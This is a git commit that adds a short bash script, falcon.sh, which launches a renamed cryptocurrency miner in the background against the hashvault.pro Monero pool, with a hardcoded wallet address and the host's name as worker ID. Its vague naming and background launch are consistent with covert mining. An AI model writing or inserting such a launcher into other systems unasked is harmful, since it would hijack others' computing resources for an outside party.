2b9c6fbdb0e5c05805501e10ae1b576fbedb0857
Anderson Barbosa <143761646+anderson-sparkweb@users.noreply.github.com>
2025-02-22 11:40:26 -0300

    Add files via upload
    Script 394

---
+++ falcon.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+xm -B --url pool.hashvault.pro:443 --user 49iptWnuqtM63oBYMbp9qpgTGmGAjgygCWdceETJPsnu9HhHkKykqjkRowCfSBC22Ab9yrLu4zfhXcuxNPWW8YsDBgDcKhD --pass $(hostname) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 &
